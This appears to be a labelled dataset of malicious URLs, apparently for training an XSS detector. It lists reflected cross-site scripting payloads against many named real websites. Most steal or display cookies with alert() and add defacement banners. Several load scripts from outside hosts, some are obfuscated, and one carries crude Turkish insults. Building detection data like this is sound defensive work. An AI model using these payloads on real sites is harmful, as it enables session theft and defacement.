http://www.crazydumper.com/search.php?keyword=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>opt=0&amp;x=0&amp;y=0,Malicious
http://inhofe.senate.gov/public/index.cfm?fuseaction=search.results&amp;cfid=34140922&amp;cftoken=23769023&amp;k<br>eywords=%3cbody%20onload=alert(/xss/)%3e&amp;submit=submit,Malicious
http://fantasy.ne.jp/admin.cgi?id='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/<br>script%3e,Malicious
http://www.klm-wh.de/igallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://sgb.bayindirlik.gov.tr/giris.aspx?__lastfocus=111-222-1933email@address.tst&amp;__viewstate=%2fwe<br>pdwullte4mtqxnzk0nzypzbycagmpzbygagepfgiea3nyywuhqxbwx3rozw1lcy9uagvtztevaw1hz2vzl2xvz28uz2lmzaidd2q<br>wagibdw8wah4evgv4daugqkfzsu5esvjmsusgvkugxlbts0foiejbs0fotenenklkzaixdw8wah8bbq4xljaumzm1ns4ymzu1nwr<br>kgaefhl9fq29udhjvbhnszxf1axjlug9zdejhy2tlzxlfxxybbqpjagtiyxrpcmxhoes%2fk8%2fdxmhp1mdpy8h%2fdaki%2bmw<br>%3d&amp;txtkkod=%3cimg%20src%3d%22javas%26%2399%3bript:alert%2840014,9080338542%29%3b%22%3e&amp;txtparola=11<br>1-222-1933email@address.tst&amp;chkhatirla=on&amp;btngiris=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower%2<br>0-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20admin%20kardes%20lutfen%20devlet%20si<br>telerinde%20daha%20dikkatli%20ol%20&lt;/h1&gt;",Malicious
http://www.realticorp.com/search.php?s=%3cscript%3ealert(document.cookie)%3c/script%3e&amp;submit=,Malicious
http://www.eniro.fi/query?what=web&amp;search_word=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://finance.bnet.com/bnet?ticker=%3c/title%3e%3cscript%3ealert(%27xss%20by%20bho%27);%3c/script%3<br>e&amp;page=quote,Malicious
http://www.beleihen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cevremiz.com/search.asp?kriter=%22%3e%3cscript%3ealert%28%27seyyar_mafya%2f%2fwww.waratta<br>ck.org%27%29%3c%2fscript%3e&amp;x=21&amp;y=3,Malicious
https://servicos.dpf.gov.br/sinpq/licenca?cnpj=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;submit=cons<br>ulta+por+cnpj&amp;tarefa=consultarcnpj&amp;licenca=,Malicious
http://www.quynhduyen.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://halebopweb2.cellus.se/?page=search&amp;searchstring=wawa%22%3e%3cscript%3ealert(123)%3c%2fscript%<br>3e&amp;submit=+,Malicious
http://video.tellytube.in/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
http://icnortheast.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.or<br>g/)%3c/script%3e%3cp,Malicious
http://freecybersearch.com/search.php?q=&lt;/title&gt;&lt;/head&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/html<br>&gt;,Malicious
http://www.nsw2007.co.uk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narc<br>oticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.wbphed.gov.in/applications/map_mnt/search.php?catagory=%27%22%3e%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%3e,Malicious
http://photofile.ru/search/photos/?search=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.royalmail.com/portal/rm/content1?catid=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,Malicious
http://www.bfca.org/member.php?id=78%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://404.iinet.com/?file=www.iinet.com/~solarwashington/action/wabills/billssigned.htm}%3c/style%3<br>e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e&amp;status=404&amp;notes=file%20does%20not%20ex<br>ist&amp;ref=,Malicious
http://sourceforge.net/project/downloading.php?groupname=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;f<br>ilename=wamp5_1.7.1a.exe&amp;use_mirror=heanet,Malicious
http://googletr.com/cars.cfm?pt=2&amp;vid=1173871212_1x02x831175274&amp;rpt=3&amp;kt=8&quot;&gt;&lt;script&gt;alert(document.c<br>ookie)&lt;/script&gt;&lt;h1&gt;by st@rext trtekforum.com&lt;/h1&gt;,Malicious
http://login.kataweb.it/registrazione/newsletter/privato.jsp?origin=%22%3e%3cscript%3ealert%28%2fxss<br>+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://www.addictinggames.com/static/php/game/searchpage.php?pageaction=search&amp;text=%3c/script%3e%3c<br>script%3ealert(1)%3c/script%3e,Malicious
http://www.petersons.com/gradchannel/code/search.asp?sponsor=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://jericho.wetpaint.com/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious
http://prints.deviantart.com/?section=shop&amp;qh=boost%3apopular&amp;q=%22%3e%3cscript%3ealert%281%29%3c%2f<br>script%3e,Malicious
http://i-net-hosting.com/de_en/doma.y.php?domainid=%20%20}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b<br>(/xss/.source));%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c<br>/marquee%3e,Malicious
http://www.carrefouruae.com/site/english/searchme.asp?query='%22%3e%3ciframe%20src=http://xssed.com%<br>3e,Malicious
http://www.mjob.in.th/search1_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;jobtype=<br>&amp;province=,Malicious
http://outside.in/search?q=zithromax+generic+zithromax+buy+zithromax+tablet%25%203cscript%20src=%27%<br>22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h<br>1%3e%3c/marquee%3e&amp;search=%20search,Malicious
http://www.emagic.co.uk/cart/checkout.asp?id=cms-pmu23&amp;standalone=no&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;,Malicious
http://gelavej.com/default.asp?sf=arama&amp;mad=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.mitschka.eu/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://es.u21fantasy.uefa.com/m/dreamteam.mc?event=0&view=graphical&id=2%3e%22%3e%3cscript%20%0a%0d%3ealert(%27xss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20:d%27)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20%20:d%3c/h1%3e%3c/marquee%3e,Malicious
http://www.zcreations.net/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ghlhoteles.com/hotel.php3?id=%3e%3cscript%3ealert('xss')%3c/script%3e%3e%3cmarquee%3e%3ch<br>1%3eby+ivan_sanchez%20-%20exploiting%20sql%20injection%20!!!%3c/h1%3e%3c/marquee%3e,Malicious
http://www.kandira.bel.tr/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://marmarali.biz/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;ww<br>w.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.cypack.com/util/race_converter.html?race_domain='%3e%22%3e%3cscript/src=http://kusomiso.c<br>om/xss.js%3e%3c/script%3e,Malicious
http://www.universityyachtclub.org/photo_album/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fondant.pe.kr/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%<br>69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%3<br>1%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35<br>%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://benq.cz/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.letrs.indiana.edu/cgi-bin/hoagy-idx.pl?type=%22%3e%3cscript%3ealert('seymen')%3c/script%3<br>e&amp;idno=atm-mc2-1,Malicious
http://search.adelaide.edu.au/ultrasearch/query/search.jsp?usearch.p_mode='%22%3e%3ch1%3erubberduck%<br>3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.cinema.nl/trefwoorden/trefwoord?tag=indianen-drama&amp;tag=soft-porno%22%3e%3cscript%3ealert(<br>document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious
http://www.fujitv.co.jp/safe/red_mpl/fujitv/bsearch.cgi?search=search&amp;genre3='%3e%22%3e%3cscript/src<br>=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.umcsummit.com/photogallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://passport.nexon.net/wz.aspx?part=/registration/signupresult&amp;signupform=%3cscript%3ealert(/xss%<br>20found%20by%20the_miller/.source)%3c/script%3e,Malicious
"http://ismailtarman.k12.tr/views_detay.asp?id=%22%3e%3cscript%3ealert(%22topunuzun+am%fdna+koyim+sos<br>yeteler+lan%20%feerefsizler%20hem%20bu%20okulda%20okuyorsunuz%20ve%20bilgisayar%fdn%20ba%fe%fdndas%f<br>dn%fdz%20%fe%fck%fcr%20etmeyip%20pesimism%20bunalma%20giriyorusunuz%20a.q%20ezikleri%20size%20verem%<br>20a.q%22)%3c/script%3e%3cmarque%3e%3ch1%3etopunuzun+am%fdna+koyim+sosyeteler+lan%20%feerefsizler%20h<br>em%20bu%20okulda%20okuyorsunuz%20ve%20bilgisayar%fdn%20ba%fe%fdndas%fdn%fdz%20%fe%fck%fcr%20etmeyip%<br>20pesimism%20bunalma%20giriyorusunuz%20a.q%20ezikleri%20size%20verem%20a.q%3cbr%3estarext%20ve%20can<br>dark%20sizi%20siksin%20emmi%20ve%20bizim%20alemimiz%3cbr%3ewww.trtekforum.com%3cbr%3esize%20olan%20k<br>%fcf%fcrlerim,g%f6z%fcm%20%f6n%fcnde%20sayg%fdm%20olsun%3c/h1%3e%3c/marquee%3e",Malicious
http://www.50webs.com/signup/?&amp;plan=0&amp;domain_type=existing&amp;epp=undefined&amp;dperiod=undefined&amp;domain=%2<br>2%3e%3cscript%3ealert()%3c/script%3e,Malicious
http://www.salta.gov.ar/noticia-gobierno-salta.php?idnoticiasalta=%22%3e%3ciframe%20onload=alert%28/<br>xss/%29%3e,Malicious
http://www.sport-hotel.si/alex_guestbook_en/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms134.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.freelotto.com/lottopicker/register.asp?firstname=%22%3e%3cscript%3ealert(%22hayirli+ramaz<br>anlar%22)%3c/script%3e,Malicious
http://www.usmint.gov/mint_tours/index.cfm?action=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.register.com/titan/domain/searchresults.rcmx?isp=1&amp;searchstring=%3cscript%3ealert('the_mi<br>ller')%3c%2fscript%3e++&amp;formname=box&amp;src=co1&amp;action=searchresults&amp;payload=&amp;&amp;,Malicious
http://www.pesyani.net/search.php?kword=%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e%20%3cscript%3ealert('by%20st@rext')%3c/script%3e,Malicious
http://www.fazenda.rj.gov.br/busca/resultado.jsp?pagina=1&amp;breadcrumb=&amp;query=%22%3e%3cscript%3ealert(<br>'xssed')%3c/script%3e,Malicious
http://www.gamemobile.co.uk/mobile-games-sitemap/sitemap.php?mobile-games=%22%3e%3cscript%3ealert(do<br>cument.cookie);%3c/script%3e,Malicious
http://www.secondhandsolar.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bundesaerztekammer.de/default.asp?his='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%<br>3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://mlb.mlb.com/news/article.jsp?ymd=20100509&amp;content_id=%22%3e%3cscript%3ealert%28document.cooki<br>e%29%3c/script%3e,Malicious
http://www.crackserver.com/search/?q=%3ch1%3e%3ccenter%3ehacking-gurus%3c%2fcenter%3e%3cbr%3e%3cmarq<br>uee%3edont-mess-with-us%3c%2fmarquee%3e%3c%2fh1%3e,Malicious
http://www.paragon-software.com/newsletters_subscription.html?email_address=%22%3e%3cscript%3ealert(<br>1);%3c/script%3e,Malicious
http://www.toyota.com.ph/dealers/index.asp?formid=0&amp;searchvalue=&quot;&gt;&lt;script&gt;alert(&quot;bluemax-grayhatz.or<br>g&quot;)&lt;/script&gt;,Malicious
http://www.backgammonveneto.org/photogallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://member.trade.cn/?errmsg=%e7%99%bb%e5%bd%95%e5%a4%b1%e8%b4%a5%ef%bc%8c%e7%94%a8%e6%88%b7%e5%90<br>%8d%e6%88%96%20%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%<br>22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%e5%af%86%e7%a0%81%e9%94%99%e8%af%af%e3%<br>80%82,Malicious
http://www.mob98.ir/fastsearch?btnsubmit=&amp;query=%3cscript%3ealert%28%27amirmagic%27%29%3c/script%3e,Malicious
http://so.la/test/ir.cgi/%22%3e%3cbody%20onload%3dalert%28%27kusomiso%2ecom%27%29%3e,Malicious
http://www.team-aaa.com/root/profile.php?enter_id=%22'e/%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.hooters.com/news_and_events/calendar/index.asp?req_event=&amp;req_state=asdf--%3e%3cscript%3e<br>alert(%22xss%22)%3c/script%3e%3cx%20x=%22&amp;submit=search&amp;c_date=&amp;req_yr=,Malicious
"http://newsforums.bbc.co.uk/nol/thread.jspa?threadid=';alert(string.fromcharcode(83,69,67,85,82,73,8<br>4,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(st<br>ring.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,<br>82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,6<br>7,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
http://www.rtuk.tv/search.php?dosearch=yes&amp;search_in_archives=true&amp;story=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://shopping.aol.com/ppesearch/ppsearch?&amp;k=%22%3e%3cscript%3ealert(%2f%5c'the-sh0ck-b0y-www.rooti<br>ngforced.org%5c'%2f)%3c%2fscript%3e,Malicious
http://www.dynavive.eu/boutique/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.castrol-oel.de/produkte.php?cat=1%22%3e%3cscript%3ealert%28/pyske/%29%3c/script%3e,Malicious
http://meta.buscape.com.br/cgi-bin/sinonimos/sinonimos_maglu.cgi?produto=%3cscript%3ealert%28666%29%<br>3c%2fscript%3e,Malicious
http://www.thyssenkruppelevator.com/search.asp?query=dsfg%22%3e%3cscript%3ealert(1337)%3c/script%3e&amp;<br>submit=submit,Malicious
http://es.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://www.yzagri.gov.cn/newssubjectdetail.php?ej=&amp;mainid=1064802412&amp;infoid=&lt;script&gt;alert(/xss/)&lt;/sc<br>ript&gt;,Malicious
"http://de.mcdonalds.fantasy.fifa.com/m/stats.mc?stat=leaders&amp;phase=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(12345,4<br>252048958)%3b&lt;/script&gt;&amp;page=2",Malicious
http://fumu.be/create.php?q=%27%3e%22%3e%27%3e%3cscript%3ealert%28%22xss+by+kusomiso.com%22%29%3c%2f<br>script%3e&amp;submit=%e7%94%9f%e6%88%90%ef%bc%81,Malicious
http://www.fettig-online.net/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mtgsy.net/kb/default.php?id=3046%22%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%3cscript%20src=http://lupbot.comule.com/asu_abangjs.js%3e%3c/script%3e%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cscript%3ea<br>lert%28%22xss%20detected%20xcode%20exploit%20scanner%22%29%3c/script%3e,Malicious
http://www.bobtheque.com/?ttl=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3<br>exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;btnfind=chercher&amp;module=nflm_lst&amp;flttpe=0,Malicious
http://www.wetpaintinjected.com/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious
http://blog.mowd.idv.tw/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%7<br>0%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32<br>%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%<br>31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://users.gametrailers.com/sendmov.php?id=112125&amp;um=1&amp;e=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6<br>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32<br>%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%<br>34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.scriptin.net/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://kaze.fr/recherche.php?motcle=%3cscript%3ealert%28%27xylitol+is+back+-+i+love+rukia+from+bleac<br>h+%3ap%27%29%3c%2fscript%3e&amp;x=6&amp;y=11,Malicious
http://news.com.com/2113-1038_3-6119515.html?toemailaddress=%22%3e%3cscript%3ealert('xss')%3c/script<br>%3e,Malicious
http://hitta.se/searchpink.aspx?searchtype=4&amp;ucsb%3atextboxwho=%22%3e%3c/script%3e%3cscript%3ealert(<br>123)%3c/script%3e&amp;ucsb%3atextboxwhere=uber0n,Malicious
http://esearch.hakka.gov.tw/hysearch/cgi/m_query.exe?home=home&amp;item_no=10&amp;query=home&amp;group=%2b&amp;check<br>_group=yes&amp;content=hakka}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%<br>22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.microsoft.com/japan/powerpro/tf/category/web_ria.mspx?keyword=7080%22%3e%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.mardigrasday.com/food.php?file=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3<br>e,Malicious
http://tv.msn.co.kr/enter/enternews/read.html?cate_code=5200&amp;article_id=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.prnet.jp/search.php?key=%22%3e'%3e%22%3c'%3c%3cscript%3e%3c/script%3e'%%3c'%3e%22%3e%3csc<br>ript/src=http://kusomiso.com/x.js%3e%3c/script%3e,Malicious
http://brendadearmond.mfr.mlxchange.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;event<br>id=3201&amp;hideresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscri<br>pt%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%<br>20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.c<br>om/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.e<br>s/xss.html%20%3c,Malicious
http://www.alleanzanazionale.it/an/page.asp?strmotore=%22%3e%3cscript%3ealert%28%22x%22%29%3b%3c%2fs<br>cript%3e&amp;x=0&amp;y=0&amp;cat=motore,Malicious
http://www.turksam.org/tr/ara.asp?arama=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;<br>x=29&amp;y=15,Malicious
http://center.uoregon.edu/iste/necc2005/program/search_results_details.php?sessionid=&quot;&gt;&lt;script&gt;alert<br>(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
https://www2.kyoto-wu.ac.jp/club/calendar/detail.cgi?event_id=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%<br>2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://www.jj-jelenajankovic.com/sr/rezultati.php?turnir_je=19%22%3e%3cscript%3ealert%28document.coo<br>kie%29%3c/script%3e,Malicious
http://health.mytelus.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(420)%3c/sc<br>ript%3e,Malicious
http://icnorthlondononline.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thede<br>faced.org/)%3c/script%3e%3cp,Malicious
http://www.emis.vito.be/index.cfm?pageid=37&amp;profile_action=dsp_jobs&amp;jobs_action=&lt;script&gt;alert(123)&lt;/<br>script&gt;,Malicious
http://qdig.sourceforge.net/qdig/qdig-demo2/index-dark.php/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://search.surfcanyon.com/search?q=%3cscript%3ealert%28%27%3a%28%27%29%3c%2fscript%3e,Malicious
http://yoursky.jpl.nasa.gov/cgi-bin/yoursky-query-cgi?dataset=none&amp;clon=%3cscript%3ealert(/nasa.gov+<br>xssed!%201/);%3c/script%3e&amp;clat=%3cscript%3ealert(/nasa.gov+xssed!%202/);%3c/script%3e&amp;radius=%3cscr<br>ipt%3ealert(/nasa.gov+xssed!%203/);%3c/script%3e&amp;coord=j2000,Malicious
http://www.peteloran.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.wen-tech.com/company.asp?id=3&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee<br>%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://murat.elmas.ws/fotogaleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.e-gov.gr/search.php?query=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c<br>%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2<br>c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript<br>%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;topic=37&amp;<br>category=0&amp;author=&amp;days=0&amp;type=stories,Malicious
http://ejang.net/blog/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
